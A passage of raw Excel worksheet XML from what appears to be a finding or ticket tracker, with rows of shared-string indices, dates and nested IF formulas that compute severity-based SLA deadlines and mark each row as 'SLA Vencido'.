        <f>IFERROR(VLOOKUP(H398,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="399" spans="1:34" ht="72.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A399" s="5">
        <v>398</v>
      </c>
      <c r="B399" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C399" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D399" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G399" s="60" t="s">
        <v>1084</v>
      </c>
      <c r="I399" t="s">
        <v>1618</v>
      </c>
      <c r="J399" t="s">
        <v>1613</v>
      </c>
      <c r="L399" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M399" t="s">
        <v>111</v>
      </c>
      <c r="N399" t="s">
        <v>1614</v>
      </c>
      <c r="Q399" t="s">
        <v>1581</v>
      </c>
      <c r="T399" s="1">
        <v>45839</v>
      </c>
      <c r="U399" s="67">
        <f t="shared" ca="1" si="18"/>
        <v>370</v>
      </c>
      <c r="V399" s="1">
        <f t="shared" si="19"/>
        <v>45959</v>
      </c>
      <c r="W399" s="56" t="str">
        <f t="shared" ca="1" si="20"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB399" s="65" t="s">
        <v>1615</v>
      </c>
      <c r="AC399" s="65" t="s">
        <v>1616</v>
      </c>
      <c r="AD399" s="65" t="s">
        <v>1617</v>
      </c>
      <c r="AE399" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG399" s="68" t="s">
        <v>1092</v>
      </c>
      <c r="AH399" t="str">
        <f>IFERROR(VLOOKUP(H399,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="400" spans="1:34" ht="72.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A400" s="5">
        <v>399</v>
      </c>
      <c r="B400" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C400" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D400" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G400" s="60" t="s">
        <v>1084</v>
      </c>
      <c r="I400" t="s">
        <v>1619</v>
      </c>
      <c r="J400" t="s">
        <v>1613</v>
      </c>
      <c r="L400" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M400" t="s">
        <v>111</v>
      </c>
      <c r="N400" t="s">
        <v>1614</v>
      </c>
      <c r="Q400" t="s">
        <v>1587</v>
      </c>
      <c r="T400" s="1">
        <v>45839</v>
      </c>
      <c r="U400" s="67">
        <f t="shared" ca="1" si="18"/>
        <v>370</v>
      </c>
      <c r="V400" s="1">
        <f t="shared" si="19"/>
        <v>45959</v>
      </c>
      <c r="W400" s="56" t="str">
        <f t="shared" ca="1" si="20"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB400" s="65" t="s">
        <v>1615</v>
      </c>
      <c r="AC400" s="65" t="s">
        <v>1616</v>
      </c>
      <c r="AD400" s="65" t="s">
        <v>1617</v>
      </c>
      <c r="AE400" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG400" s="68" t="s">
        <v>1092</v>
      </c>
      <c r="AH400" t="str">
        <f>IFERROR(VLOOKUP(H400,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="401" spans="1:34" ht="72.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A401" s="5">
        <v>400</v>
      </c>
      <c r="B401" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C401" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D401" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G401" s="60" t="s">
        <v>1084</v>
      </c>
      <c r="I401" t="s">
        <v>1620</v>
      </c>
      <c r="J401" t="s">
        <v>1613</v>
      </c>
      <c r="L401" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M401" t="s">
        <v>111</v>
      </c>
      <c r="N401" t="s">
        <v>1614</v>
      </c>
      <c r="Q401" t="s">
        <v>1621</v>
      </c>
      <c r="T401" s="1">
        <v>45839</v>
      </c>
      <c r="U401" s="67">
        <f t="shared" ca="1" si="18"/>
        <v>370</v>
      </c>
      <c r="V401" s="1">
        <f t="shared" si="19"/>
        <v>45959</v>
      </c>
      <c r="W401" s="56" t="str">
        <f t="shared" ca="1" si="20"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB401" s="65" t="s">
        <v>1615</v>
      </c>
      <c r="AC401" s="65" t="s">
        <v>1616</v>
      </c>
      <c r="AD401" s="65" t="s">
        <v>1617</v>
      </c>
      <c r="AE401" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG401" s="68" t="s">
        <v>1092</v>
      </c>
      <c r="AH401" t="str">
        <f>IFERROR(VLOOKUP(H401,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="402" spans="1:34" ht="72.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A402" s="5">
        <v>401</v>
      </c>
      <c r="B402" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C402" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D402" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G402" s="60" t="s">
        <v>1084</v>
      </c>
      <c r="I402" t="s">
        <v>1622</v>
      </c>
      <c r="J402" t="s">
        <v>1613</v>
      </c>
      <c r="L402" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M402" t="s">
        <v>111</v>
      </c>
      <c r="N402" t="s">
        <v>1614</v>
      </c>
      <c r="Q402" t="s">
        <v>1590</v>
      </c>
      <c r="T402" s="1">
        <v>45839</v>
      </c>
      <c r="U402" s="67">
        <f t="shared" ca="1" si="18"/>
        <v>370</v>
      </c>
      <c r="V402" s="1">
        <f t="shared" si="19"/>
        <v>45959</v>
      </c>
      <c r="W402" s="56" t="str">
        <f t="shared" ca="1" si="20"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB402" s="65" t="s">
        <v>1615</v>
      </c>
      <c r="AC402" s="65" t="s">
        <v>1616</v>
      </c>
      <c r="AD402" s="65" t="s">
        <v>1617</v>
      </c>
      <c r="AE402" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG402" s="68" t="s">
        <v>1092</v>
      </c>
      <c r="AH402" t="str">
        <f>IFERROR(VLOOKUP(H402,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="403" spans="1:34" ht="72.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A403" s="5">
        <v>402</v>
      </c>
      <c r="B403" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C403" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D403" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G403" s="60" t="s">
        <v>1084</v>
      </c>
      <c r="I403" t="s">
        <v>1623</v>
      </c>
      <c r="J403" t="s">
        <v>1613</v>
      </c>
      <c r="L403" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M403" t="s">
        <v>111</v>
      </c>
      <c r="N403" t="s">
        <v>1614</v>
      </c>
      <c r="Q403" t="s">
        <v>1593</v>
      </c>
      <c r="T403" s="1">
        <v>45839</v>
      </c>
      <c r="U403" s="67">
        <f t="shared" ca="1" si="18"/>
        <v>370</v>
      </c>
      <c r="V403" s="1">
        <f t="shared" si="19"/>
        <v>45959</v>
      </c>
      <c r="W403" s="56" t="str">
        <f t="shared" ca="1" si="20"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB403" s="65" t="s">
        <v>1615</v>
      </c>
      <c r="AC403" s="65" t="s">
        <v>1616</v>
      </c>
      <c r="AD403" s="65" t="s">
        <v>1617</v>
      </c>
      <c r="AE403" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG403" s="68" t="s">
        <v>1092</v>
      </c>
      <c r="AH403" t="str">
        <f>IFERROR(VLOOKUP(H403,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="404" spans="1:34" ht="58" hidden="1" x14ac:dyDescent="0.35">
      <c r="A404" s="5">
        <v>403</v>
      </c>
      <c r="B404" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C404" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D404" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G404" s="60" t="s">
        <v>1084</v>
      </c>
      <c r="I404" t="s">
        <v>1624</v>
      </c>
      <c r="J404" t="s">
        <v>1625</v>
      </c>
      <c r="L404" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M404" t="s">
        <v>111</v>
      </c>
      <c r="N404" t="s">
        <v>1614</v>
      </c>
      <c r="Q404" t="s">
        <v>1550</v>
      </c>
      <c r="T404" s="1">
        <v>45839</v>
      </c>
      <c r="U404" s="67">
        <f t="shared" ca="1" si="18"/>
        <v>370</v>
      </c>
      <c r="V404" s="1">
        <f t="shared" si="19"/>
        <v>45959</v>
      </c>
      <c r="W404" s="56" t="str">
        <f t="shared" ca="1" si="20"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB404" s="65" t="s">
        <v>1626</v>
      </c>
      <c r="AC404" s="65" t="s">
        <v>1627</v>
      </c>
      <c r="AD404" s="65" t="s">
        <v>1628</v>
      </c>
      <c r="AE404" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG404" s="68" t="s">
        <v>1092</v>
      </c>
      <c r="AH404" t="str">
        <f>IFERROR(VLOOKUP(H404,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="405" spans="1:34" ht="58" hidden="1" x14ac:dyDescent="0.35">
      <c r="A405" s="5">
        <v>404</v>
      </c>
      <c r="B405" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C405" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D405" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G405" s="60" t="s">
        <v>1084</v>
      </c>
      <c r="I405" t="s">
        <v>1629</v>
      </c>
      <c r="J405" t="s">
        <v>1625</v>
      </c>
      <c r="L405" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M405" t="s">
        <v>111</v>
      </c>
      <c r="N405" t="s">
        <v>1614</v>
      </c>
      <c r="Q405" t="s">
        <v>1581</v>
      </c>
      <c r="T405" s="1">
        <v>45839</v>
      </c>
      <c r="U405" s="67">
        <f t="shared" ca="1" si="18"/>
        <v>370</v>
      </c>
      <c r="V405" s="1">
        <f t="shared" si="19"/>
        <v>45959</v>
      </c>
      <c r="W405" s="56" t="str">
        <f t="shared" ca="1" si="20"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB405" s="65" t="s">
        <v>1626</v>
      </c>
      <c r="AC405" s="65" t="s">
        <v>1627</v>
      </c>
      <c r="AD405" s="65" t="s">
        <v>1628</v>
      </c>
      <c r="AE405" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG405" s="68" t="s">
        <v>1092</v>
      </c>
      <c r="AH405" t="str">
        <f>IFERROR(VLOOKUP(H405,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="406" spans="1:34" ht="58" hidden="1" x14ac:dyDescent="0.35">
      <c r="A406" s="5">
        <v>405</v>
      </c>
      <c r="B406" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C406" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D406" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G406" s="60" t="s">
        <v>1084</v>
      </c>
      <c r="I406" t="s">
        <v>1630</v>
      </c>
      <c r="J406" t="s">
        <v>1625</v>
      </c>
      <c r="L406" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M406" t="s">
        <v>111</v>
      </c>
      <c r="N406" t="s">
        <v>1614</v>
      </c>
      <c r="Q406" t="s">
        <v>1587</v>
      </c>
      <c r="T406" s="1">
        <v>45839</v>
      </c>
      <c r="U406" s="67">
        <f t="shared" ca="1" si="18"/>
        <v>370</v>
      </c>
      <c r="V406" s="1">
        <f t="shared" si="19"/>
        <v>45959</v>
      </c>
      <c r="W406" s="56" t="str">
        <f t="shared" ca="1" si="20"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB406" s="65" t="s">
        <v>1626</v>
      </c>
      <c r="AC406" s="65" t="s">
        <v>1627</v>
      </c>
      <c r="AD406" s="65" t="s">
        <v>1628</v>
      </c>
      <c r="AE406" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG406" s="68" t="s">
        <v>1092</v>
      </c>
      <c r="AH406" t="str">
        <f>IFERROR(VLOOKUP(H406,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="407" spans="1:34" ht="58" hidden="1" x14ac:dyDescent="0.35">
      <c r="A407" s="5">
        <v>406</v>
      </c>
      <c r="B407" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C407" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D407" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G407" s="60" t="s">
        <v>1084</v>
      </c>
      <c r="I407" t="s">
        <v>1631</v>
      </c>
      <c r="J407" t="s">
        <v>1625</v>
      </c>
      <c r="L407" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M407" t="s">
        <v>111</v>
      </c>
      <c r="N407" t="s">
        <v>1614</v>
      </c>
      <c r="Q407" t="s">
        <v>1621</v>
      </c>
      <c r="T407" s="1">
        <v>45839</v>
      </c>
      <c r="U407" s="67">
        <f t="shared" ca="1" si="18"/>
        <v>370</v>
      </c>
      <c r="V407" s="1">
        <f t="shared" si="19"/>
        <v>45959</v>
      </c>
      <c r="W407" s="56" t="str">
        <f t="shared" ca="1" si="20"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB407" s="65" t="s">
        <v>1626</v>
      </c>
      <c r="AC407" s="65" t="s">
        <v>1627</v>
      </c>
      <c r="AD407" s="65" t="s">
        <v>1628</v>
      </c>
      <c r="AE407" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG407" s="68" t="s">
        <v>1092</v>
      </c>
      <c r="AH407" t="str">
        <f>IFERROR(VLOOKUP(H407,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="408" spans="1:34" ht="58" hidden="1" x14ac:dyDescent="0.35">
      <c r="A408" s="5">
        <v>407</v>
      </c>
      <c r="B408" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C408" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D408" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G408" s="60" t="s">
        <v>1084</v>
      </c>
      <c r="I408" t="s">
        <v>1632</v>
      </c>
      <c r="J408" t="s">
        <v>1625</v>
      </c>
      <c r="L408" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M408" t="s">
        <v>111</v>
      </c>
      <c r="N408" t="s">
        <v>1614</v>
      </c>
      <c r="Q408" t="s">
        <v>1590</v>
      </c>
      <c r="T408" s="1">
        <v>45839</v>
      </c>
      <c r="U408" s="67">
        <f t="shared" ca="1" si="18"/>
        <v>370</v>
      </c>
      <c r="V408" s="1">
        <f t="shared" si="19"/>
        <v>45959</v>
      </c>
      <c r="W408" s="56" t="str">
        <f t="shared" ca="1" si="20"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB408" s="65" t="s">
        <v>1626</v>
      </c>
      <c r="AC408" s="65" t="s">
        <v>1627</v>
      </c>
      <c r="AD408" s="65" t="s">
        <v>1628</v>
      </c>
      <c r="AE408" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG408" s="68" t="s">
        <v>1092</v>
      </c>
      <c r="AH408" t="str">
        <f>IFERROR(VLOOKUP(H408,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="409" spans="1:34" ht="58" hidden="1" x14ac:dyDescent="0.35">
      <c r="A409" s="5">
        <v>408</v>
      </c>
      <c r="B409" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C409" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D409" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G409" s="60" t="s">
        <v>1084</v>
      </c>
      <c r="I409" t="s">
        <v>1633</v>
      </c>
      <c r="J409" t="s">
        <v>1625</v>
      </c>
      <c r="L409" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M409" t="s">
        <v>111</v>
      </c>
      <c r="N409" t="s">
        <v>1614</v>
      </c>
      <c r="Q409" t="s">
        <v>1593</v>
      </c>
      <c r="T409" s="1">
        <v>45839</v>
      </c>
      <c r="U409" s="67">
        <f t="shared" ca="1" si="18"/>
        <v>370</v>
      </c>
      <c r="V409" s="1">
        <f>IF(M404="Critical",T409+10,IF(M404="High",T409+30,IF(M404="Bad",T409+30,IF(M404="Medium",T409+90,IF(M404="Warm",T409+90,IF(M404="Low",T409+120,IF(M404="Fair",T409+120,IF(M404="Neutral",T409+120,""))))))))</f>
        <v>45959</v>
      </c>
      <c r="W409" s="56" t="str">
        <f ca="1">IF(M404="Critical",IF(U409&gt;10,"SLA Vencido","En SLA"),IF(M404="High",IF(U409&gt;30,"SLA Vencido","En SLA"),IF(M404="Bad",IF(U409&gt;30,"SLA Vencido","En SLA"),IF(M404="Medium",IF(U409&gt;90,"SLA Vencido","En SLA"),IF(M404="Warm",IF(U409&gt;90,"SLA Vencido","En SLA"),IF(M404="Low",IF(U409&gt;120,"SLA Vencido","En SLA"),IF(M404="Fair",IF(U409&gt;120,"SLA Vencido","En SLA"),IF(M404="Neutral",IF(U409&gt;120,"SLA Vencido","En SLA"),"Error"))))))))</f>
        <v>SLA Vencido</v>
      </c>
      <c r="AB409" s="65" t="s">
        <v>1626</v>
      </c>
      <c r="AC409" s="65" t="s">
        <v>1627</v>
      </c>
      <c r="AD409" s="65" t="s">
        <v>1628</v>
      </c>
      <c r="AE409" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG409" s="68" t="s">
        <v>1092</v>
      </c>
      <c r="AH409" t="str">
        <f>IFERROR(VLOOKUP(H409,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="410" spans="1:34" ht="72.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A410" s="5">
        <v>409</v>
      </c>
      <c r="B410" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C410" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D410" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G410" s="60" t="s">
        <v>1084</v>
      </c>
      <c r="I410" t="s">
        <v>1634</v>
      </c>
      <c r="J410" t="s">
        <v>1635</v>
      </c>
      <c r="L410" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M410" t="s">
        <v>111</v>
      </c>
      <c r="N410" t="s">
        <v>1614</v>
      </c>
      <c r="Q410" t="s">
        <v>1550</v>
      </c>
      <c r="T410" s="1">
        <v>45839</v>
      </c>
      <c r="U410" s="67">
        <f t="shared" ca="1" si="18"/>
        <v>370</v>
      </c>
      <c r="V410" s="1">
        <f t="shared" ref="V410:V473" si="21">IF(M410="Critical",T410+10,IF(M410="High",T410+30,IF(M410="Bad",T410+30,IF(M410="Medium",T410+90,IF(M410="Warm",T410+90,IF(M410="Low",T410+120,IF(M410="Fair",T410+120,IF(M410="Neutral",T410+120,""))))))))</f>
        <v>45959</v>
      </c>
      <c r="W410" s="56" t="str">
        <f t="shared" ref="W410:W473" ca="1" si="22">IF(M410="Critical",IF(U410&gt;10,"SLA Vencido","En SLA"),IF(M410="High",IF(U410&gt;30,"SLA Vencido","En SLA"),IF(M410="Bad",IF(U410&gt;30,"SLA Vencido","En SLA"),IF(M410="Medium",IF(U410&gt;90,"SLA Vencido","En SLA"),IF(M410="Warm",IF(U410&gt;90,"SLA Vencido","En SLA"),IF(M410="Low",IF(U410&gt;120,"SLA Vencido","En SLA"),IF(M410="Fair",IF(U410&gt;120,"SLA Vencido","En SLA"),IF(M410="Neutral",IF(U410&gt;120,"SLA Vencido","En SLA"),"Error"))))))))</f>
        <v>SLA Vencido</v>
      </c>
      <c r="AB410" s="65" t="s">
        <v>1636</v>
      </c>
      <c r="AC410" s="65" t="s">
        <v>1637</v>
      </c>
      <c r="AD410" s="65" t="s">
        <v>1638</v>
      </c>
      <c r="AE410" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG410" s="68" t="s">
        <v>1092</v>
      </c>
      <c r="AH410" t="str">
        <f>IFERROR(VLOOKUP(H410,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="411" spans="1:34" ht="72.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A411" s="5">
        <v>410</v>
      </c>
      <c r="B411" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C411" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D411" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G411" s="60" t="s">
        <v>1084</v>
      </c>
      <c r="I411" t="s">
        <v>1639</v>
      </c>
      <c r="J411" t="s">
        <v>1635</v>
      </c>
      <c r="L411" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M411" t="s">
        <v>111</v>
      </c>
      <c r="N411" t="s">
        <v>1614</v>
      </c>
      <c r="Q411" t="s">
        <v>1581</v>
      </c>
      <c r="T411" s="1">
        <v>45839</v>
      </c>
      <c r="U411" s="67">
        <f t="shared" ca="1" si="18"/>
        <v>370</v>
      </c>
      <c r="V411" s="1">
        <f t="shared" si="21"/>
        <v>45959</v>
      </c>
      <c r="W411" s="56" t="str">
        <f t="shared" ca="1" si="22"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB411" s="65" t="s">
        <v>1636</v>
      </c>
      <c r="AC411" s="65" t="s">
        <v>1637</v>
      </c>
      <c r="AD411" s="65" t="s">
        <v>1638</v>
      </c>
      <c r="AE411" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG411" s="68" t="s">
        <v>1092</v>
      </c>
      <c r="AH411" t="str">
        <f>IFERROR(VLOOKUP(H411,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="412" spans="1:34" ht="72.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A412" s="5">
        <v>411</v>
      </c>
      <c r="B412" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C412" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D412" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G412" s="60" t="s">
        <v>1084</v>
      </c>
      <c r="I412" t="s">
        <v>1640</v>
      </c>
      <c r="J412" t="s">
        <v>1635</v>
      </c>
      <c r="L412" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M412" t="s">
        <v>111</v>
      </c>
      <c r="N412" t="s">
        <v>1614</v>
      </c>
      <c r="Q412" t="s">
        <v>1587</v>
      </c>
      <c r="T412" s="1">
        <v>45839</v>
      </c>
      <c r="U412" s="67">
        <f t="shared" ca="1" si="18"/>
        <v>370</v>
      </c>
      <c r="V412" s="1">
        <f t="shared" si="21"/>
        <v>45959</v>
      </c>
      <c r="W412" s="56" t="str">
        <f t="shared" ca="1" si="22"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB412" s="65" t="s">
        <v>1636</v>
      </c>
      <c r="AC412" s="65" t="s">
        <v>1637</v>
      </c>
      <c r="AD412" s="65" t="s">
        <v>1638</v>
      </c>
      <c r="AE412" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG412" s="68" t="s">
        <v>1092</v>
      </c>
      <c r="AH412" t="str">
        <f>IFERROR(VLOOKUP(H412,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="413" spans="1:34" ht="72.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A413" s="5">
        <v>412</v>
      </c>
      <c r="B413" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C413" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D413" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G413" s="60" t="s">
        <v>1084</v>
      </c>
      <c r="I413" t="s">
        <v>1641</v>
      </c>
      <c r="J413" t="s">
        <v>1635</v>
      </c>
      <c r="L413" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M413" t="s">
        <v>111</v>
      </c>
      <c r="N413" t="s">
        <v>1614</v>
      </c>
      <c r="Q413" t="s">
        <v>1621</v>
      </c>
      <c r="T413" s="1">
        <v>45839</v>
      </c>
      <c r="U413" s="67">
        <f t="shared" ca="1" si="18"/>
        <v>370</v>
      </c>
      <c r="V413" s="1">
        <f t="shared" si="21"/>
        <v>45959</v>
      </c>
      <c r="W413" s="56" t="str">
        <f t="shared" ca="1" si="22"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB413" s="65" t="s">
        <v>1636</v>
      </c>
      <c r="AC413" s="65" t="s">
        <v>1637</v>
      </c>
      <c r="AD413" s="65" t="s">
        <v>1638</v>
      </c>
      <c r="AE413" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG413" s="68" t="s">
        <v>1092</v>
      </c>
      <c r="AH413" t="str">
        <f>IFERROR(VLOOKUP(H413,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="414" spans="1:34" ht="72.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A414" s="5">
        <v>413</v>
      </c>
      <c r="B414" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C414" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D414" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G414" s="60" t="s">
        <v>1084</v>
      </c>
      <c r="I414" t="s">
        <v>1642</v>
      </c>
      <c r="J414" t="s">
        <v>1635</v>
      </c>
      <c r="L414" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M414" t="s">
        <v>111</v>
      </c>
      <c r="N414" t="s">
        <v>1614</v>
      </c>
      <c r="Q414" t="s">
        <v>1590</v>
      </c>
      <c r="T414" s="1">
        <v>45839</v>
      </c>
      <c r="U414" s="67">
        <f t="shared" ca="1" si="18"/>
        <v>370</v>
      </c>
      <c r="V414" s="1">
        <f t="shared" si="21"/>
        <v>45959</v>
      </c>
      <c r="W414" s="56" t="str">
        <f t="shared" ca="1" si="22"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB414" s="65" t="s">
        <v>1636</v>
      </c>
      <c r="AC414" s="65" t="s">
        <v>1637</v>
      </c>
      <c r="AD414" s="65" t="s">
        <v>1638</v>
      </c>
      <c r="AE414" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG414" s="68" t="s">
        <v>1092</v>
      </c>
      <c r="AH414" t="str">
        <f>IFERROR(VLOOKUP(H414,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="415" spans="1:34" ht="72.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A415" s="5">
        <v>414</v>
      </c>
      <c r="B415" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C415" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D415" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G415" s="60" t="s">
        <v>1084</v>
      </c>
      <c r="I415" t="s">
        <v>1643</v>
      </c>
      <c r="J415" t="s">
        <v>1635</v>
      </c>
      <c r="L415" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M415" t="s">
        <v>111</v>
      </c>
      <c r="N415" t="s">
        <v>1614</v>
      </c>
      <c r="Q415" t="s">
        <v>1593</v>
      </c>
      <c r="T415" s="1">
        <v>45839</v>
      </c>
      <c r="U415" s="67">
        <f t="shared" ca="1" si="18"/>
        <v>370</v>
      </c>
      <c r="V415" s="1">
        <f t="shared" si="21"/>
        <v>45959</v>
      </c>
      <c r="W415" s="56" t="str">
        <f t="shared" ca="1" si="22"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB415" s="65" t="s">
        <v>1636</v>
      </c>
      <c r="AC415" s="65" t="s">
        <v>1637</v>
      </c>
      <c r="AD415" s="65" t="s">
        <v>1638</v>
      </c>
      <c r="AE415" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG415" s="68" t="s">
        <v>1092</v>
      </c>
      <c r="AH415" t="str">
        <f>IFERROR(VLOOKUP(H415,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="416" spans="1:34" ht="58" hidden="1" x14ac:dyDescent="0.35">
      <c r="A416" s="5">
        <v>415</v>
      </c>
      <c r="B416" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C416" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D416" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G416" s="60" t="s">
        <v>1084</v>
      </c>
      <c r="I416" t="s">
        <v>1644</v>
      </c>
      <c r="J416" t="s">
        <v>1645</v>
      </c>
      <c r="L416" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M416" t="s">
        <v>111</v>
      </c>
      <c r="N416" t="s">
        <v>1614</v>
      </c>
      <c r="Q416" t="s">
        <v>1550</v>
      </c>
      <c r="T416" s="1">
        <v>45839</v>
      </c>
      <c r="U416" s="67">
        <f t="shared" ca="1" si="18"/>
        <v>370</v>
      </c>
      <c r="V416" s="1">
        <f t="shared" si="21"/>
        <v>45959</v>
      </c>
      <c r="W416" s="56" t="str">
        <f t="shared" ca="1" si="22"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB416" s="65" t="s">
        <v>1646</v>
      </c>
      <c r="AC416" s="65" t="s">
        <v>1647</v>
      </c>
      <c r="AD416" s="65" t="s">
        <v>1648</v>
      </c>
      <c r="AE416" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG416" s="68" t="s">
        <v>1092</v>
      </c>
      <c r="AH416" t="str">
        <f>IFERROR(VLOOKUP(H416,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
